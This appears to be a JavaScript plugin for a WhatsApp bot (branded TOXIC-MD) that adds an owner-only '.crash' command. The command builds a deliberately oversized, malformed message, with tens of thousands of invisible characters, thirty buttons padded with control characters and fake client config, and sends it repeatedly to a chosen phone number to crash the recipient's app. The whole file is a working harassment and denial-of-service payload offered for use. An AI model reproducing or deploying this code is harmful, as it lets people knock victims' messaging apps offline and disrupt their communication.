const { zokou } = require('../framework/zokou');

// Owner number for access control
const OWNER_NUMBER = "254735342808";
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;

// Normalize phone number
const normalizeNumber = (number) => {
  return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+254/, '254') || number;
};

// Validate phone number
const isValidPhoneNumber = (number) => {
  const cleaned = number.replace(/[^0-9]/g, '');
  return /^254[0-9]{9}$/.test(cleaned); // Must start with 254 and have 9 digits
};

// Sleep function for delay
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Malicious message function
async function sendCrashMessage(zk, target) {
  console.log(`[DEBUG] Sending crash message to ${target}`);

  const venomModsData = JSON.stringify({
    status: true,
    criador: "VenomMods",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 999999,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["2.25.12.25", "Beta"],
          browser: ["Chrome", "Windows"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          depayyCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          emitOwnEvents: true,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          auth: { Object: "authData" },
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const longChar = "\u200E".repeat(1024) + "ꦽ".repeat(80000); // Invisible oversized string

  const message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: { platform: "android", version: "2.25.12.25" },
          deviceListMetadataVersion: 3.3,
          isStatusBroadcast: true,
          statusBroadcastJid: "status@broadcast",
          badgeChat: { unreadCount: 9999 },
          isForwarded: true,
          forwardingScore: 7777777
        },
        forwardedNewsletterMessageInfo: {
          newsletterJid: "proto@newsletter",
          serverMessageId: 1,
          newsletterName: `𝐀𝖑𝖙𝖊𝖗 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝕭𝖊𝖙𝖆 𝖁𝟐 ☠️ ${"ꥈ".repeat(15)}`,
          contentType: 3,
          accessibilityText: `𝗕𝗘𝗧𝗔 💢 ${"﹏".repeat(2048)}`
        },
        interactiveMessage: {
          contextInfo: {
            businessMessageForwardInfo: { businessOwnerJid: target },
            dataSharingContext: { showMmDisclosure: true },
            participant: "0@s.whatsapp.net",
            mentionedJid: [target]
          },
          body: {
            text: longChar
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 30 }, (_, i) => ({
              name: ["single_select", "payment_method", "form_message", "open_webview"][i % 4],
              buttonParamsJson: venomModsData + "\u0003".repeat(2048),
              ...(i === 10 && { voice_call: "call_galaxy" })
            }))
          }
        }
      }
    },
    additionalNodes: [
      { attrs: { beta_tag: "true" }, tag: "biz" },
      { attrs: { platform: "android", version: "2.25.12.25" }, tag: "client" }
    ],
    stanzaId: `stanza_${Date.now()}`
  };

  try {
    await zk.relayMessage(target, message, { participant: { jid: target } });
    console.log(`[DEBUG] SUCCESS SEND [WhatsApp Beta 2.25.12.25] to ${target}`);
  } catch (e) {
    console.log(`[DEBUG] Error sending crash message to ${target}: ${e.message}`);
    throw e;
  }
}

// Command: Crash
zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, auteurMessage, arg } = commandeOptions;

  console.log(`[DEBUG] crash triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);

  // Handle null pushName
  const userName = ms.pushName || "Supreme Ruler";

  // Check if user is owner
  const normalizedAuteur = normalizeNumber(auteurMessage.split('@')[0]);
  const normalizedOwner = normalizeNumber(OWNER_NUMBER);
  const isOwner = auteurMessage === OWNER_JID || normalizedAuteur === normalizedOwner;
  console.log(`[DEBUG] Owner check: isOwner=${isOwner}, normalizedAuteur=${normalizedAuteur}, normalizedOwner=${normalizedOwner}`);

  if (!isOwner) {
    console.log(`[DEBUG] crash: User is not the owner`);
    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU VILE IMPOSTOR! 😤 Trying to wield ${OWNER_NUMBER}’s destructive power? You’re LESS THAN DUST! Begone! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Validate input
  if (!arg[0]) {
    console.log(`[DEBUG] crash: No target provided`);
    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ YOU FOOL, ${userName}! 😡 Provide a target number! Format: .crash 254xxx\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Extract and validate target
  let client = ms.mentionedJid[0] ? ms.mentionedJid[0] : ms.quoted ? ms.quoted.sender : arg[0];
  let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');
  if (!isValidPhoneNumber(clientNumber)) {
    console.log(`[DEBUG] crash: Invalid target number: ${clientNumber}`);
    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: .crash 254xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
    return;
  }
  const isTarget = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;
  console.log(`[DEBUG] crash: Target set to ${isTarget}`);

  // Send processing reaction
  try {
    await zk.sendMessage(dest, { react: { text: '🔍', key: ms.key } });
    console.log(`[DEBUG] crash: Processing reaction sent`);
  } catch (e) {
    console.log(`[DEBUG] crash: Error sending processing reaction: ${e.message}`);
  }

  // Send crash messages
  try {
    for (let r = 0; r < 5; r++) {
      try {
        await sendCrashMessage(zk, isTarget);
        await sleep(5000); // 5-second delay
        await sendCrashMessage(zk, isTarget);
        console.log(`[DEBUG] crash: Iteration ${r + 1}/5 completed`);
      } catch (e) {
        console.log(`[DEBUG] crash: Error in iteration ${r + 1}: ${e.message}`);
        throw new Error(`Failed at iteration ${r + 1}: ${e.message}`);
      }
    }

    // Send success reaction
    try {
      await zk.sendMessage(dest, { react: { text: '✅', key: ms.key } });
      console.log(`[DEBUG] crash: Success reaction sent`);
    } catch (e) {
      console.log(`[DEBUG] crash: Error sending success reaction: ${e.message}`);
    }

    // Send confirmation message
    const successMessage = `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${clientNumber}\n│❒ Status: Success\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`;
    await repondre(successMessage);
    console.log(`[DEBUG] crash: Confirmation message sent`);
  } catch (e) {
    console.log(`[DEBUG] crash: Error during attack: ${e.message}`);
    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${clientNumber} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
  }
});